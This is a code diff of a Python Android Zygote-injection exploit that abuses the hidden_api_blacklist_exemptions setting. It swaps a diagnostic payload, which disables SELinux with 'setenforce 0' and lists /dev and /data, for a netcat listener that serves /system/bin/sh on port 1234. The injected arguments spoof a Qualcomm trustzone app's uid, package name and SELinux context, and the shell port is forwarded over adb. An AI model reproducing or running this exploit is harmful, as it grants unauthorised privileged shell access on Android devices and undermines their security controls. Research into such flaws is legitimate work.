@@ -179,6 +179,8 @@ class Stage1Exploit:
         else:
             raise ZygoteInjectionException("netcat binary was not found")
 
+   
+
     @staticmethod
     def generate_stage1_exploit(command: str, exploit_type: str) -> str:
         "generates the hidden_api_blacklist_exemptions value to trigger the exploit"
@@ -187,14 +189,14 @@ class Stage1Exploit:
         assert "," not in command
         # TODO let you specify the SELinux context through command line arguments
         raw_zygote_arguments = [
-            "--setuid=1000",
-            "--setgid=1000",
+            "--setuid=10079",
+            "--setgid=10079",
             "--setgroups=3003",
             "--target-sdk-version=28",
-            "--app-data-dir=/data/user/0/jp.kyocera.kerr",
+            "--nice-name=com.qualcomm.qti.qms.service.trustzoneaccess",
+            "--app-data-dir=/data/user/0/com.qualcomm.qti.qms.service.trustzoneaccess",
             "--runtime-args",
-            "--nice-name=kerr_svc",
-            "--seinfo=platform:kerr_svc:complete",
+            "--seinfo=sysmonappapp:sysmonapp_app:complete",
             "--runtime-flags=32767",
             "--invoke-with",
             f"{command}#",
@@ -226,9 +228,13 @@ class Stage1Exploit:
                     return True
         return False
 
-
     def exploit_stage1(self) -> bool:
-    
+        if self.is_port_open(1234):
+            print("The exploit is already running!")
+            self.device.forward("tcp:1234", "tcp:1234")
+            return True
+
+        # make sure the hidden_api_blacklist_exemptions variable is reset
         self.shell_execute(
             ["settings", "delete", "global", "hidden_api_blacklist_exemptions"]
         )
@@ -239,22 +245,10 @@ class Stage1Exploit:
         elif exploit_type == "old":
             print("Using old (pre-Android 12) exploit type")
 
-        shell_script = (
-            "mkdir -p /data/data/jp.kyocera; "
-            "{ "
-            "cat /proc/self/status; "
-            "id; "
-            "setenforce 0; "
-            "ls /dev; "
-            "ls /data; "
-            "} > /data/data/jp.kyocera.kdfs 2> /data/data/jp.kyocera.kerr"
-        )
-        full_command = (
-            f"(settings delete global hidden_api_blacklist_exemptions; "
-            f"sh -c '{shell_script}')&"
-        )
-
-        exploit_value = self.generate_stage1_exploit(full_command, exploit_type)
+        netcat_command = self.find_netcat_command()
+        parsed_netcat_command = shlex.join(netcat_command)
+        command = f"(settings delete global hidden_api_blacklist_exemptions;{parsed_netcat_command} -s 127.0.0.1 -p 1234 -L /system/bin/sh)&"
+        exploit_value = self.generate_stage1_exploit(command, exploit_type)
         exploit_command = [
             "settings",
             "put",
@@ -263,24 +257,31 @@ class Stage1Exploit:
             exploit_value,
         ]
 
+        # run the exploit!
         self.shell_execute(["am", "force-stop", "com.android.settings"])
         self.shell_execute(exploit_command)
         time.sleep(0.25)
         self.shell_execute(["am", "start", "-a", "android.settings.SETTINGS"])
-        print("Zygote injection triggered, waiting for commands to execute...")
+        print("Zygote injection complete, waiting for code to execute...")
 
-    
-        for _ in range(20):
-            check_cmd = f"test -f /data/data/jp.kyocera.kdfs && echo exists || echo missing"
-            result = self.shell_execute(check_cmd)
-            if "exists" in result["stdout"]:
-                print("Stage 1 success: log files created.")
-                return True
+        for current_try in range(20):
+            # if the setting was deleted, this indicates the exploit succeeded
+            setting_value = self.get_setting(
+                "global", "hidden_api_blacklist_exemptions"
+            )
+            if setting_value == "null":
+                if self.is_port_open(1234):
+                    self.device.forward("tcp:1234", "tcp:1234")
+                    print("Stage 1 success!")
+                    return True
+                else:
+                    raise ZygoteInjectionException(
+                        "setting was deleted but no listener was found"
+                    )
             time.sleep(0.5)
-
+        print("Stage 1 failed, reboot and try again")
+        # exploit failed, clean up
         self.shell_execute(
             ["settings", "delete", "global", "hidden_api_blacklist_exemptions"]
         )
-        print("Stage 1 failed: log files not found within timeout.")
         return False
-    # ====================================================
